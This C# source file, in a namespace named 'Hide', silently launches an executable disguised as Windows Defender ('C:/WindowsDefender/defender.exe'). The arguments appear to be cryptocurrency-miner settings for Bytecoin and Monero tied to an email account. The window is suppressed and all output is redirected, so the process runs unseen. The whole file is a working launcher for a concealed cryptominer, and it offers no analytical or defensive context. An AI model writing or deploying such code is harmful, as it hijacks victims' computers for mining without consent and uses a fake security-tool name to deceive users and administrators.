using System;

namespace Hide
{
    static class Program
    {
        static void Main()
        {
            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
            startInfo.FileName = "C:/WindowsDefender/defender.exe";
            startInfo.Arguments = "-user dylan@thisiswhereidostuff.com -bcn 2 -xmr 2";
            startInfo.RedirectStandardOutput = true;
            startInfo.RedirectStandardError = true;
            startInfo.UseShellExecute = false;
            startInfo.CreateNoWindow = true;

            System.Diagnostics.Process processTemp = new System.Diagnostics.Process();
            processTemp.StartInfo = startInfo;
            processTemp.EnableRaisingEvents = true;
            try
            {
                processTemp.Start();
            }
            catch (Exception e)
            {
                throw;
            }
        }
    }
}
